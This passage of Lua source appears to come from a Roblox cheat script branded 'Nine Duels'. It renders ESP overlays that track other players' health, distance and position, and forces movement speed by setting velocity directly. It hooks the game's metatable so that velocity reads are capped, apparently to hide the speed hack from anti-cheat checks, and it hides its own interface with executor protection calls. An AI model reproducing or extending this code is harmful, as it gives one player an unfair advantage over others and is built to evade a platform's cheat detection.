				textLabel2.Font = Enum.Font.GothamBold
				textLabel2.TextSize = 9
				textLabel2.TextXAlignment = Enum.TextXAlignment.Center
				textLabel2.TextStrokeTransparency = 0.5
				textLabel2.TextStrokeColor3 = Color3.new(0, 0, 0)
				local n32 = 0
				local connection = nil

				connection = RunService.RenderStepped:Connect(function()
					if not espActive or not instance.Parent then
						connection:Disconnect()
						return
					end
					local now2 = tick()
					if now2 - n32 < 0.016 then
						return
					end
					n32 = now2
					local character2 = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					local head = character:FindFirstChild("Head")
					local humanoid = character:FindFirstChildOfClass("Humanoid")

					if not (character2 and humanoidRootPart and head and humanoid) then
						instance.Enabled = false
						return
					end

					instance.Enabled = espEnabled
					local v87 = espTracers[arg]

					if v87 and espShowTracer then
						local currentCamera = workspace.CurrentCamera
						local viewportSize = currentCamera.ViewportSize
						local v88, v89 = currentCamera:WorldToViewportPoint(character2.Position - Vector3.new(0, 3, 0))
						local v90, flag18 = currentCamera:WorldToViewportPoint(humanoidRootPart.Position)
						local x, y

						if v89 and v88.Z > 0 then
							x = v88.X
							y = v88.Y
						else
							x = viewportSize.X * 0.5
							y = viewportSize.Y - 6
						end

						local x2 = v90.X
						local y2 = v90.Y

						if v90.Z <= 0 then
							x2 = viewportSize.X - (x2 or viewportSize.X * 0.5)
							y2 = viewportSize.Y - (y2 or viewportSize.Y * 0.5)
							flag18 = true
						end

						if not flag18 or v90.Z <= 0 then
							local n33 = viewportSize.X * 0.5
							local n34 = viewportSize.Y * 0.5
							local n35 = x2 - n33
							local n36 = y2 - n34
							local n37 = viewportSize.X * 0.5
							local n38 = viewportSize.Y * 0.5
							local v91 = 0.5
							local n39 = math.max(math.abs(n35) / n37, math.abs(n36) / n38, v91)
							x2 = n33 + n35 / n39
							y2 = n34 + n36 / n39
						end

						local n33 = math.clamp(x2, 6, viewportSize.X - 6)
						local n34 = math.clamp(y2, 6, viewportSize.Y - 50)
						local n35 = n33 - x
						local n36 = n34 - y
						local v91 = math.sqrt(n35 * n35 + n36 * n36)

						if v91 > 2 then
							v87.Position = UDim2.fromOffset((x + n33) * 0.5, (y + n34) * 0.5)
							local v92 = 1
							v87.Size = UDim2.fromOffset(math.max(1, v91), v92)
							v87.Rotation = math.deg(math.atan2(n36, n35))
							v87.Visible = true
						else
							v87.Visible = false
						end
					elseif v87 then
						v87.Visible = false
					end

					local n33 = math.floor(humanoid.Health)
					local v88 = 1
					local n34 = math.max(math.floor(humanoid.MaxHealth), v88)
					local n35 = n33 / n34
					local n36 = math.floor((character2.Position - humanoidRootPart.Position).Magnitude)
					local n37 = math.floor(humanoidRootPart.AssemblyLinearVelocity.Magnitude + 0.5)
					local v89 = espUnderFeet and humanoidRootPart or head
					local vector = espUnderFeet and Vector3.new(0, -3, 0) or Vector3.new(0, 1, 0)

					if instance.Adornee ~= v89 then
						instance.Adornee = v89
					end

					if instance.StudsOffset ~= vector then
						instance.StudsOffset = vector
					end

					textLabel.Visible = espShowName
					instance3.Visible = espShowHealth
					local v90 = espShowDistance or espShowSpeed
					textLabel2.Visible = v90

					if v90 then
						local tbl17 = {}

						if espShowHealth then
							table.insert(tbl17, n33 .. "/" .. n34)
						end

						if espShowDistance then
							table.insert(tbl17, n36 .. "m")
						end

						if espShowSpeed then
							table.insert(tbl17, n37 .. "m/s")
						end

						textLabel2.Text = table.concat(tbl17, " • ")
					end

					local v91 = 0
					frame3.Size = UDim2.new(math.clamp(n35, 0, 1), 0, 1, v91)
					frame3.BackgroundColor3 = color2:Lerp(color4, math.clamp(1 - n35, 0, 1) * 0.45)
					textLabel.TextColor3 = n35 > 0.4 and color4 or Color3.fromRGB(220, 220, 220)
					local v92 = espHighlights[arg]

					if v92 then
						local flag18 = not espShowHighlight

						if not flag18 then
							flag18 = not (v92.marker and v92.marker.Parent and v92.fill and v92.outline and v92.thick)
						end

						if flag18 then
							fn31(arg)
						else
							local v93 = 1
							local n38 = (math.sin(tick() * 2.05) + v93) * 0.5
							local n39 = math.max(0, math.sin(tick() * 2.05 - 0.95)) ^ 9
							local v94 = color:Lerp(color2, 0.4 + n38 * 0.22):Lerp(color3, 0.2 + n38 * 0.18)
							v92.fill.OutlineColor = v94
							v92.fill.OutlineTransparency = 0.5
							v92.thick.Color3 = v94
							v92.thick.LineThickness = 0.1
							v92.outline.OutlineColor = color5
							v92.outline.OutlineTransparency = 0.97 - n39 * 0.55
						end
					elseif espShowHighlight then
						fn32(arg, character)
					end
				end)
			end

			enableESP = function()
				espActive = true

				if espShowTracer and not espTracerGui then
					espTracerGui = Instance.new("ScreenGui")
					espTracerGui.Name = "NineDuelsESPTracers"
					espTracerGui.ResetOnSpawn = false
					espTracerGui.IgnoreGuiInset = true
					espTracerGui.DisplayOrder = 49

					pcall(function()
						if syn and syn.protect_gui then
							syn.protect_gui(espTracerGui)
						end
					end)

					if not pcall(function()
						espTracerGui.Parent = game:GetService("CoreGui")
					end) then
						espTracerGui.Parent = LP:FindFirstChildOfClass("PlayerGui")
					end
				end

				for _, player_ in ipairs(Players:GetPlayers()) do
					buildESP(player_)
				end

				Players.PlayerAdded:Connect(function(player_)
					player_.CharacterAdded:Connect(function()
						task.wait(0.5)

						if espActive then
							buildESP(player_)
						end
					end)
				end)

				for _, player_ in ipairs(Players:GetPlayers()) do
					player_.CharacterAdded:Connect(function()
						task.wait(0.5)

						if espActive then
							buildESP(player_)
						end
					end)
				end

				Players.PlayerRemoving:Connect(function(player_)
					removeESP(player_)
				end)
			end

			clearAllESP = function()
				for _, player_ in ipairs(Players:GetPlayers()) do
					removeESP(player_)
				end

				espBBs = {}
				espHighlights = {}
				espTracers = {}

				if espTracerGui then
					pcall(function()
						espTracerGui:Destroy()
					end)

					espTracerGui = nil
				end

				espActive = false
				fn35()
			end
		end
	end

	do
		local fn35

		do
			do
				local crystalS2SpeedState, fn36, fn37, fn38, fn39, fn40

				do
					do
						MOB_POS_FILE = "NineDuelsV1configLOL1/BtnPos.json"

						loadBtnPositions = function()
							local ok, result = pcall(function()
								return HS:JSONDecode(readfile(MOB_POS_FILE))
							end)

							if ok and type(result) == "table" then
								return result
							end
							return {}
						end

						saveBtnPositions = function()
							if not writefile then
								return
							end

							if not mobGuiRef then
								return
							end

							pcall(function()
								if makefolder and isfolder and not isfolder("NineDuelsV1configLOL1") then
									makefolder("NineDuelsV1configLOL1")
								end
							end)

							local tbl17 = {}

							for _, child in ipairs(mobGuiRef:GetChildren()) do
								if child:IsA("Frame") and child.Name:sub(1, 5) == "SBtn_" then
									local tbl18 = {
										xs = child.Position.X.Scale,
										xo = child.Position.X.Offset,
										ys = child.Position.Y.Scale,
										yo = child.Position.Y.Offset,
									}

									tbl17[child.Name:sub(6)] = tbl18
								end
							end

							local sBtnLock = mobGuiRef:FindFirstChild("SBtnLock")

							if sBtnLock then
								tbl17.__lock = {
									xs = sBtnLock.Position.X.Scale,
									xo = sBtnLock.Position.X.Offset,
									ys = sBtnLock.Position.Y.Scale,
									yo = sBtnLock.Position.Y.Offset,
								}
							end

							tbl17.__frame = {
								xs = mobGuiRef.Position.X.Scale,
								xo = mobGuiRef.Position.X.Offset,
								ys = mobGuiRef.Position.Y.Scale,
								yo = mobGuiRef.Position.Y.Offset,
							}

							pcall(function()
								writefile(MOB_POS_FILE, HS:JSONEncode(tbl17))
							end)
						end

						task.spawn(function()
							while true do
								task.wait(3)
								pcall(saveBtnPositions)
							end
						end)

						refreshSpeedModeLabel = nil
						saveConfig = nil
						startUnwalk = nil
						stopUnwalk = nil
						startAntiRagdoll = nil
						stopAntiRagdoll = nil
						startAutoLeft = nil
						stopAutoLeft = nil
						startAutoRight = nil
						stopAutoRight = nil
						startAutoTP = nil
						stopAutoTP = nil
						enableAntiLag = nil
						disableAntiLag = nil
						enableStretchRez = nil
						disableStretchRez = nil
						startBatAimbot = nil
						stopBatAimbot = nil
						queueAutoBatStart = nil
						runDrop = nil
						runTPFloor = nil
						cursedInstaReset = nil
						startAutoSteal = nil
						stopAutoSteal = nil
						toggleCarryMode = nil
						toggleLaggerMode = nil

						addShimmerToLabel = function(arg, arg2, arg3)
							local uiGradient = Instance.new("UIGradient", arg)
							local colorSequence = ColorSequence.new
							local tbl17 = {}
							local v86 = ColorSequenceKeypoint.new(0, arg2 or Color3.fromRGB(200, 200, 200))
							local v87 = ColorSequenceKeypoint.new(0.5, arg3 or Color3.fromRGB(255, 255, 255))
							local new = ColorSequenceKeypoint.new
							arg2 = arg2 or Color3.fromRGB(200, 205, 200)
							local v88 = table.pack(new(1, arg2))
							tbl17[1] = v86
							tbl17[2] = v87

							do
								local values = table.pack(table.unpack(v88, 1, v88.n))
								table.move(values, 1, values.n, 3, tbl17)
							end

							uiGradient.Color = colorSequence(tbl17)
							local numberSequence = NumberSequence.new
							local tbl18 = {}
							local v89 = NumberSequenceKeypoint.new(0, 0.5, 0)
							local v90 = NumberSequenceKeypoint.new(0.5, 0, 0)
							local new2 = NumberSequenceKeypoint.new
							local v91 = 0
							tbl18[1] = v89
							tbl18[2] = v90

							do
								local values = table.pack(new2(1, 0.3, v91))
								table.move(values, 1, values.n, 3, tbl18)
							end

							uiGradient.Transparency = numberSequence(tbl18)
							return uiGradient
						end

						fovConn = nil

						applyFOV = function()
							if fovConn then
								fovConn:Disconnect()
							end

							fovConn = RunService.RenderStepped:Connect(function()
								local currentCamera = workspace.CurrentCamera

								if currentCamera then
									currentCamera.FieldOfView = fovValue
								end
							end)
						end

						applyFOV()

						createRagdollBillboard = function(arg, arg2)
							if not ragdollGuiEnabled then
								return nil
							end
							local color = Color3.fromRGB(255, 255, 255)
							local color2 = Color3.fromRGB(12, 12, 12)
							local name = "Row_" .. arg2

							pcall(function()
								local v86 = game:GetService("CoreGui"):FindFirstChild(name)

								if v86 then
									v86:Destroy()
								end

								local v87 = LP:FindFirstChild("PlayerGui")

								if v87 then
									local v88 = v87:FindFirstChild(name)

									if v88 then
										v88:Destroy()
									end
								end
							end)

							local screenGui = Instance.new("ScreenGui")
							screenGui.Name = name
							screenGui.ResetOnSpawn = false
							screenGui.IgnoreGuiInset = true
							screenGui.DisplayOrder = 30

							pcall(function()
								if syn and syn.protect_gui then
									syn.protect_gui(screenGui)
								end
							end)

							if
								not pcall(function()
									screenGui.Parent = game:GetService("CoreGui")
								end)
							then
								screenGui.Parent = LP:WaitForChild("PlayerGui")
							end

							local frame = Instance.new("Frame", screenGui)
							frame.Size = UDim2.new(0, 210, 0, 80)
							frame.Position = UDim2.new(0.5, -210 / 2, 0, 58)
							frame.BackgroundColor3 = color2
							frame.BackgroundTransparency = 1
							frame.BorderSizePixel = 0
							frame.ZIndex = 30
							frame.Active = true
							Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
							local uiStroke = Instance.new("UIStroke", frame)
							uiStroke.Color = color
							uiStroke.Thickness = 3
							uiStroke.Transparency = 1

							task.spawn(function()
								local n32 = 0

								while uiStroke and uiStroke.Parent do
									n32 += 0.05
									uiStroke.Transparency = 0.4 + math.abs(math.sin(n32 * 2.5)) * 0.25
									uiStroke.Color = Color3.fromRGB(255, 255, 255)
									task.wait(0.04)
								end
							end)

							local textLabel = Instance.new("TextLabel", frame)
							textLabel.Size = UDim2.new(1, -16, 0, 28)
							textLabel.Position = UDim2.new(0, 8, 0, 50)
							textLabel.BackgroundTransparency = 1
							local flag18 = arg2 == "RAGDOLL" and true
							local text

							if flag18 then
								text = flag18
							else
								text = arg2 == "STONE" and "STONED" or arg2 .. " TIMER"
							end

							textLabel.Text = text
							textLabel.TextColor3 = color
							textLabel.Font = Enum.Font.GothamBlack
							textLabel.TextSize = 13
							textLabel.TextXAlignment = Enum.TextXAlignment.Center
							textLabel.ZIndex = 32
							local frame2 = Instance.new("Frame", frame)
							frame2.Size = UDim2.new(1, -20, 0, 1)
							frame2.Position = UDim2.new(0, 10, 0, 30)
							frame2.BackgroundColor3 = color
							frame2.BackgroundTransparency = 0.5
							frame2.BorderSizePixel = 0
							frame2.ZIndex = 31
							local textLabel2 = Instance.new("TextLabel", frame)
							textLabel2.Size = UDim2.new(1, 0, 0, 42)
							textLabel2.Position = UDim2.new(0, 0, 0, 40)
							textLabel2.BackgroundTransparency = 1
							local v86 = "s"
							textLabel2.Text = string.format("%.1f", arg) .. v86
							textLabel2.TextColor3 = color
							textLabel2.Font = Enum.Font.GothamBlack
							textLabel2.TextSize = 18
							textLabel2.TextXAlignment = Enum.TextXAlignment.Center
							textLabel2.ZIndex = 60
							local v87 = addShimmerToLabel(textLabel2, color, color)

							task.spawn(function()
								local v88 = 0

								while textLabel2 and textLabel2.Parent do
									v88 += 0.04
									v87.Offset = Vector2.new(math.sin(v88) * 0.5, 0)
									task.wait(0.04)
								end
							end)

							local position = nil
							local position2 = nil
							local flag19 = false

							frame.InputBegan:Connect(function(input)
								if
									input.UserInputType == Enum.UserInputType.MouseButton1
									or input.UserInputType == Enum.UserInputType.Touch
								then
									flag19 = true
									position = input.Position
									position2 = frame.Position

									input.Changed:Connect(function()
										if input.UserInputState == Enum.UserInputState.End then
											flag19 = false
										end
									end)
								end
							end)

							UIS.InputChanged:Connect(function(input)
								if
									flag19
									and (
										input.UserInputType == Enum.UserInputType.MouseMovement
										or input.UserInputType == Enum.UserInputType.Touch
									)
								then
									local n32 = input.Position - position
									frame.Position = UDim2.new(
										position2.X.Scale,
										position2.X.Offset + n32.X,
										position2.Y.Scale,
										position2.Y.Offset + n32.Y
									)
								end
							end)

							local now2 = tick()
							local connection = nil

							connection = RunService.Heartbeat:Connect(function()
								local n32 = math.max(0, arg - tick() - now2)

								if n32 <= 0 then
									connection:Disconnect()

									pcall(function()
										screenGui:Destroy()
									end)
								elseif textLabel2 and textLabel2.Parent then
									textLabel2.Text = string.format("%.1f", n32) .. "s"
								end
							end)

							return screenGui
						end

						setupSpeedIndicator = function(arg)
							local head = arg:WaitForChild("Head", 5)
							if not head then
								return
							end

							if head:FindFirstChild("PhantomSpeedBB") then
								head.PhantomSpeedBB:Destroy()
							end

							local billboardGui = Instance.new("BillboardGui", head)
							billboardGui.Name = "PhantomSpeedBB"
							billboardGui.Size = UDim2.new(0, 150, 0, 60)
							billboardGui.StudsOffset = Vector3.new(0, 3, 0)
							billboardGui.AlwaysOnTop = true
							local instance = Instance.new("TextLabel", billboardGui)
							instance.Size = UDim2.new(1, 0, 0.42, 0)
							instance.BackgroundTransparency = 1
							instance.Text = ".gg/nineduels"
							instance.TextColor3 = Color3.fromRGB(190, 190, 190)
							instance.Font = Enum.Font.GothamBold
							instance.TextScaled = true
							instance.TextStrokeTransparency = 1
							local uiStroke = Instance.new("UIStroke", instance)
							uiStroke.Thickness = 2
							uiStroke.Color = Color3.fromRGB(0, 0, 0)
							local uiGradient = Instance.new("UIGradient", instance)
							local colorSequence = ColorSequence.new
							local tbl17 = {}
							local v86 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
							local v87 = ColorSequenceKeypoint.new(0.36, Color3.fromRGB(190, 190, 190))
							local v88 = ColorSequenceKeypoint.new(0.44, Color3.fromRGB(235, 235, 235))
							local v89 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
							local v90 = ColorSequenceKeypoint.new(0.56, Color3.fromRGB(235, 235, 235))
							local v91 = ColorSequenceKeypoint.new(0.64, Color3.fromRGB(190, 190, 190))
							local new = ColorSequenceKeypoint.new
							local color = Color3.fromRGB
							local v92 = 55
							tbl17[1] = v86
							tbl17[2] = v87
							tbl17[3] = v88
							tbl17[4] = v89
							tbl17[5] = v90
							tbl17[6] = v91

							do
								local values = table.pack(new(1, color(55, v92, 55)))
								table.move(values, 1, values.n, 7, tbl17)
							end

							uiGradient.Color = colorSequence(tbl17)

							task.spawn(function()
								while instance and instance.Parent do
									uiGradient.Offset = Vector2.new(-1, 0)
									local tween_ = TweenService:Create(
										uiGradient,
										TweenInfo.new(1.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
										{ Offset = Vector2.new(1, 0) }
									)
									tween_:Play()
									tween_.Completed:Wait()
									task.wait(0.05)
								end
							end)

							local frame = Instance.new("Frame", billboardGui)
							frame.Size = UDim2.new(0.8, 0, 0, 1.5)
							frame.Position = UDim2.new(0.175, 0, 0.47, 0)
							frame.BackgroundColor3 = Color3.fromRGB(190, 190, 190)
							frame.BorderSizePixel = 0
							frame.ZIndex = 10
							local uiStroke2 = Instance.new("UIStroke", frame)
							uiStroke2.Thickness = 1
							uiStroke2.Color = Color3.fromRGB(55, 55, 55)
							local instance2 = Instance.new("UIGradient", frame)
							local colorSequence2 = ColorSequence.new
							local tbl18 = {}
							local v93 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
							local v94 = ColorSequenceKeypoint.new(0.36, Color3.fromRGB(190, 190, 190))
							local v95 = ColorSequenceKeypoint.new(0.44, Color3.fromRGB(235, 235, 235))
							local v96 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
							local v97 = ColorSequenceKeypoint.new(0.56, Color3.fromRGB(235, 235, 235))
							local v98 = ColorSequenceKeypoint.new(0.64, Color3.fromRGB(190, 190, 190))
							local new2 = ColorSequenceKeypoint.new
							local color2 = Color3.fromRGB
							local v99 = 55
							local v100 = 55
							tbl18[1] = v93
							tbl18[2] = v94
							tbl18[3] = v95
							tbl18[4] = v96
							tbl18[5] = v97
							tbl18[6] = v98

							do
								local values = table.pack(new2(1, color2(55, v99, v100)))
								table.move(values, 1, values.n, 7, tbl18)
							end

							instance2.Color = colorSequence2(tbl18)

							task.spawn(function()
								while frame and frame.Parent do
									instance2.Offset = Vector2.new(-1, 0)
									local tween_ = TweenService:Create(
										instance2,
										TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
										{ Offset = Vector2.new(1, 0) }
									)
									tween_:Play()
									tween_.Completed:Wait()
									task.wait(0.1)
								end
							end)

							speedLabel = Instance.new("TextLabel", billboardGui)
							speedLabel.Size = UDim2.new(1, 0, 0.44, 0)
							speedLabel.Position = UDim2.new(0, 0, 0.52, 0)
							speedLabel.BackgroundTransparency = 1
							speedLabel.Text = "0.0"
							speedLabel.TextColor3 = Color3.fromRGB(190, 190, 190)
							speedLabel.Font = Enum.Font.GothamBold
							speedLabel.TextScaled = true
							speedLabel.TextStrokeTransparency = 1
							local uiStroke3 = Instance.new("UIStroke", speedLabel)
							uiStroke3.Thickness = 1.6
							uiStroke3.Color = Color3.fromRGB(0, 0, 0)
							local uiGradient2 = Instance.new("UIGradient", speedLabel)
							local colorSequence3 = ColorSequence.new
							local tbl19 = {}
							local v101 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
							local v102 = ColorSequenceKeypoint.new(0.36, Color3.fromRGB(190, 190, 190))
							local v103 = ColorSequenceKeypoint.new(0.44, Color3.fromRGB(235, 235, 235))
							local v104 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
							local v105 = ColorSequenceKeypoint.new(0.56, Color3.fromRGB(235, 235, 235))
							local v106 = ColorSequenceKeypoint.new(0.64, Color3.fromRGB(190, 190, 190))
							tbl19[1] = v101
							tbl19[2] = v102
							tbl19[3] = v103
							tbl19[4] = v104
							tbl19[5] = v105
							tbl19[6] = v106

							do
								local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(55, 55, 55)))
								table.move(values, 1, values.n, 7, tbl19)
							end

							uiGradient2.Color = colorSequence3(tbl19)

							task.spawn(function()
								while speedLabel and speedLabel.Parent do
									uiGradient2.Offset = Vector2.new(-1, 0)
									local tween_ = TweenService:Create(
										uiGradient2,
										TweenInfo.new(1.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
										{ Offset = Vector2.new(1, 0) }
									)
									tween_:Play()
									tween_.Completed:Wait()
									task.wait(0.1)
								end
							end)
						end

						getActiveMoveSpeed = function()
							if laggerCarryToggled then
								return LAGGER_CARRY_SPEED
							end

							if laggerModeEnabled then
								return LAGGER_SPEED
							end

							if carrySpeedActive then
								return CS
							end
							return NS
						end

						getAutoPathSpeed = function()
							if laggerModeEnabled or laggerCarryToggled then
								return LAGGER_SPEED
							end
							return NS
						end

						do
							local crystalSpeedSpoofState = _G.__CrystalSpeedSpoofState

							if type(crystalSpeedSpoofState) == "table" then
								crystalSpeedSpoofState.enabled = false
							end
						end
					end

					crystalS2SpeedState = _G.__CrystalS2SpeedState

					if type(crystalS2SpeedState) ~= "table" then
						crystalS2SpeedState = { hooked = false }
						_G.__CrystalS2SpeedState = crystalS2SpeedState
					end

					crystalS2SpeedState.enabled = false
					crystalS2SpeedState.root = nil
					crystalS2SpeedState.velChecked = setmetatable({}, { __mode = "k" })

					fn36 = function(arg)
						crystalS2SpeedState.velChecked = setmetatable({}, { __mode = "k" })
						if not arg then
							crystalS2SpeedState.root = nil
							return nil
						end
						local humanoidRootPart = arg:WaitForChild("HumanoidRootPart", 5)

						if humanoidRootPart then
							crystalS2SpeedState.root = humanoidRootPart
							crystalS2SpeedState.velChecked[humanoidRootPart] = true
						end

						return humanoidRootPart
					end

					fn37 = function(root)
						if not root then
							return
						end
						crystalS2SpeedState.root = root
						crystalS2SpeedState.velChecked[root] = true
						if crystalS2SpeedState.hooked then
							return
						end
						local flag18 = type(getrawmetatable) ~= "function" or type(setreadonly) ~= "function"
						local flag19

						if flag18 then
							flag19 = flag18
						else
							local v86 = "function"
							flag19 = type(newcclosure) ~= v86
						end

						if flag19 or type(checkcaller) ~= "function" then
							return
						end

						pcall(function()
							local v86 = getrawmetatable(game)
							if not v86 then
								return
							end
							local value = rawget(v86, "__index")
							if type(value) ~= "function" and type(value) ~= "table" then
								return
							end

							local v87 = newcclosure(function(arg, arg2)
								local v87

								if type(value) == "function" then
									v87 = value(arg, arg2)
								else
									v87 = value[arg2]
								end

								if
									not checkcaller()
									and crystalS2SpeedState.velChecked[arg]
									and (arg2 == "AssemblyLinearVelocity" or arg2 == "Velocity")
									and typeof(v87) == "Vector3"
									and v87.Magnitude > 20
								then
									return v87.Unit * 20
								end
								return v87
							end)

							setreadonly(v86, false)
							v86.__index = v87
							crystalS2SpeedState.hooked = true
							setreadonly(v86, true)
						end)
					end

					fn38 = function()
						lastMoveDir = Vector3.zero
						crystalS2SpeedState.enabled = false
					end

					_G.__CrystalResetSpeedDirection = function()
						lastMoveDir = Vector3.zero
						local character = LP.Character
						local humanoid = character and character:FindFirstChildOfClass("Humanoid")
						character = character and character:FindFirstChild("HumanoidRootPart")

						if humanoid and character and humanoid.MoveDirection.Magnitude <= 0.05 then
							character.AssemblyLinearVelocity = Vector3.new(0, character.AssemblyLinearVelocity.Y, 0)
						end
					end

					fn39 = function(arg)
						if not arg then
							return true
						end
						local state = arg:GetState()
						return arg.PlatformStand
							or state == Enum.HumanoidStateType.Physics
							or state == Enum.HumanoidStateType.Ragdoll
							or state == Enum.HumanoidStateType.FallingDown
					end

					do
						local function fn41()
							if laggerModeEnabled or laggerCarryToggled then
								return laggerCarryToggled and LAGGER_CARRY_SPEED or LAGGER_SPEED
							end
							return CS
						end

						local function fn42(arg)
							return carrySpeedActive or arg and carrySpeedActive
						end

						fn40 = function(arg)
							if fn42(arg) then
								return fn41()
							end

							if laggerModeEnabled or laggerCarryToggled then
								return laggerCarryToggled and LAGGER_CARRY_SPEED or LAGGER_SPEED
							end
							return NS
						end
					end
				end

				do
					local function stopSpeedBoost()
						if _G.__speedBoostConn then
							_G.__speedBoostConn:Disconnect()
							_G.__speedBoostConn = nil
						end

						fn38()
					end

					local function fn41(arg, arg2)
						local character = LP.Character
						local humanoid = character and character:FindFirstChildOfClass("Humanoid")
						local v86 = character and character:FindFirstChild("HumanoidRootPart")
						if not humanoid or not v86 or humanoid.Health <= 0 then
							return
						end

						if type(arg2) ~= "number" or arg2 ~= arg2 or arg2 <= 0 or arg2 == math.huge then
							return
						end
						local y = v86.AssemblyLinearVelocity.Y
						if _G._ZurichHub_MovementBlocked == true or _G._CrystalHub_MovementBlocked == true then
							v86.AssemblyLinearVelocity = Vector3.new(0, math.min(y, 0), 0)
							return
						end

						if arg and arg.Magnitude > 0.05 then
							pcall(function()
								if v86.SetNetworkOwner then
									v86:SetNetworkOwner(LP)
								end
							end)

							local unit = arg.Unit
							v86.AssemblyLinearVelocity = Vector3.new(unit.X * arg2, y, unit.Z * arg2)
						else
							v86.AssemblyLinearVelocity = Vector3.new(0, y, 0)
						end
					end

					local function nineDuelsSpeedStart()
						stopSpeedBoost()

						_G.__speedBoostConn = RunService.RenderStepped:Connect(function()
							local character = LP.Character
							local humanoid = character and character:FindFirstChildOfClass("Humanoid")
							local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
							if not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
								return
							end

							if
								State and State.batV2Toggled
								or autoBatEnabled
								or autoLeftEnabled
								or autoRightEnabled
								or _G.dropActive
								or _G.IsDropping
							then
								fn38()
								return
							end

							if fn39(humanoid) then
								lastMoveDir = Vector3.zero
								return
							end

							if
								crystalS2SpeedState.root ~= humanoidRootPart
								or not crystalS2SpeedState.velChecked[humanoidRootPart]
							then
								lastMoveDir = Vector3.zero
								fn36(character)
								fn37(humanoidRootPart)
							end

							crystalS2SpeedState.enabled = true
							local moveDirection

							if humanoid.MoveDirection.Magnitude > 0 then
								lastMoveDir = humanoid.MoveDirection
								moveDirection = humanoid.MoveDirection
							else
								moveDirection = nil

								if lastMoveDir.Magnitude > 0 then
									moveDirection = nil

									for _, v86 in ipairs({
										Enum.KeyCode.W,
										Enum.KeyCode.A,
										Enum.KeyCode.S,
										Enum.KeyCode.D,
										Enum.KeyCode.Up,
										Enum.KeyCode.Left,
										Enum.KeyCode.Down,
										Enum.KeyCode.Right,
									}) do
										if UIS:IsKeyDown(v86) then
											moveDirection = lastMoveDir
											break
										else
											moveDirection = nil
										end
									end
								end
							end

							local n32 = tonumber(
								fn40(LP:GetAttribute("Stealing") == true or character:GetAttribute("Stealing") == true)
							) or 16
							fn41(moveDirection, n32)

							if speedLabel then
								speedLabel.Text =
									string.format("%.1f", moveDirection and moveDirection.Magnitude > 0.05 and n32 or 0)
							end
						end)
					end

					_G.__refreshSpeedBoost = function()
						nineDuelsSpeedStart()
					end

					_G.__stopSpeedBoost = stopSpeedBoost
					_G.NineDuelsSpeedStart = nineDuelsSpeedStart
					_G.NineDuelsSpeedStop = stopSpeedBoost

					if LP.Character then
						local v86 = fn36(LP.Character)
						fn37(v86)
					end

					if _G._nineduelsSpeedCharConn then
						pcall(function()
							_G._nineduelsSpeedCharConn:Disconnect()
						end)
					end

					_G._nineduelsSpeedCharConn = LP.CharacterAdded:Connect(function(character)
						task.wait(0.5)
						fn38()
						local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)

						if humanoidRootPart then
							fn36(character)
							fn37(humanoidRootPart)
						end

						nineDuelsSpeedStart()
						return
					end)

					nineDuelsSpeedStart()
				end
			end

			do
				local tbl17, fn36, fn37, fn38

				do
					fn35 = function(arg, arg2)
						if not arg or not arg.Parent or not arg2 then
							return
						end
						arg.Velocity = Vector3.new(arg2.X, arg.Velocity.Y, arg2.Z)
					end

					tbl17 = {
						applied = false,
						waiting = false,
						watchUntil = 0,
						graceUntil = 0,
						savedMode = nil,
						stealWasActive = false,
					}

					fn36 = function()
						if laggerCarryToggled then
							return "Lagger Carry"
						end

						if laggerModeEnabled then
							return carrySpeedActive and "Lagger Carry" or "Lagger"
						end
						return carrySpeedActive and "Carry" or "Normal"
					end

					fn37 = function(arg, arg2, arg3)
						local flag18 = arg3 == true
						laggerCarryToggled = flag18
						laggerModeEnabled = arg == true and not flag18
						carrySpeedActive = arg2 == true and not flag18
						speedMode = carrySpeedActive

						if refreshSpeedModeLabel then
							refreshSpeedModeLabel()
						end

						if mobBtnRefs.lagger then
							mobBtnRefs.lagger(laggerModeEnabled)
						end

						if mobBtnRefs.carrySpeed then
							mobBtnRefs.carrySpeed(carrySpeedActive)
						end

						if mobBtnRefs.laggerCarry then
							mobBtnRefs.laggerCarry(laggerCarryToggled)
						end

						if laggerCarryModeSetVisual then
							laggerCarryModeSetVisual(laggerCarryToggled)
						end

						if toggleRefs and toggleRefs.laggerCarryMode then
							toggleRefs.laggerCarryMode(laggerCarryToggled)
						end
					end

					do
						local function fn39(arg)
							local str6 = tostring(arg or ""):lower()
							return str6:find("bat", 1, true)
								or str6:find("slap", 1, true)
								or str6:find("medusa", 1, true)
								or str6:find("head", 1, true)
								or str6:find("stone", 1, true)
						end

						fn38 = function()
							local character = LP.Character
							if not character then
								return false
							end

							for _, v86 in ipairs({
								"Carrying",
								"IsCarrying",
								"Grabbed",
								"Holding",
								"StealHold",
								"HasGrab",
							}) do
								local flag18 = character:FindFirstChild(v86, true)

								if flag18 then
									local value = flag18:IsA("BoolValue") and flag18.Value
										or flag18:IsA("ObjectValue") and flag18.Value

									if value then
										flag18 = value
									else
										flag18 = flag18:IsA("StringValue") and flag18.Value ~= ""
									end
								end

								if flag18 then
									return true
								end
							end

							for _, child in ipairs(character:GetChildren()) do
								local str6 = child.Name:lower()

								if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
									if
										child:FindFirstChildOfClass("Humanoid")
											and child:FindFirstChild("HumanoidRootPart")
										or str6:find("brainrot")
										or str6:find("animal")
										or str6:find("carry")
										or str6:find("grab")
										or str6:find("steal")
										or str6:find("carry")
									then
										return true
									end
									continue
								end

								if child:IsA("Tool") and not fn39(child.Name) then
									return true
								end
							end

							return false
						end
					end
				end

				do
					local function fn39()
						tbl17.waiting = false
						tbl17.watchUntil = 0

						if not tbl17.applied then
							tbl17.savedMode = fn36()
						end

						tbl17.applied = true
